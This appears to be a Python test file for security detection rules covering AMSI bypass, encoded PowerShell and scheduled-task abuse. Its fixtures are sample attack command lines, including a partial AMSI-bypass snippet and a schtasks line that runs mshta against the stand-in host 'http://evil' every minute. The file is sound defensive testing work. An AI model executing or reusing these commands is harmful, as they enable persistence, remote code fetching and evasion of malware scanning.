import json
from pathlib import Path

from src.core.correlation.rules.week1.amsi_bypass_enriched import amsi_bypass_enriched
from src.core.correlation.rules.week1.powershell_encoded_enriched import powershell_encoded_enriched
from src.core.correlation.rules.week1.scheduled_task_lolbin_enriched import scheduled_task_lolbin_enriched


def _load(path: str):
    p = Path(path)
    return json.loads(p.read_text(encoding='utf-8'))


def test_amsi_bypass_enriched_positive():
    evt = {
        "command_line": "powershell -NoP -w hidden; [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')",
        "timestamp": 1700000500
    }
    assert amsi_bypass_enriched(evt)


def test_powershell_encoded_enriched_positive():
    evt = {
        "command_line": "powershell -NoP -enc SGVsbG8gV29ybGQ=",
        "timestamp": 1700000600
    }
    assert powershell_encoded_enriched(evt)


def test_scheduled_task_lolbin_enriched_positive():
    evt = {
        "process": "schtasks.exe",
        "command_line": "SCHTASKS /Create /SC MINUTE /TN update /TR mshta http://evil",
        "timestamp": 1700000700
    }
    assert scheduled_task_lolbin_enriched(evt)
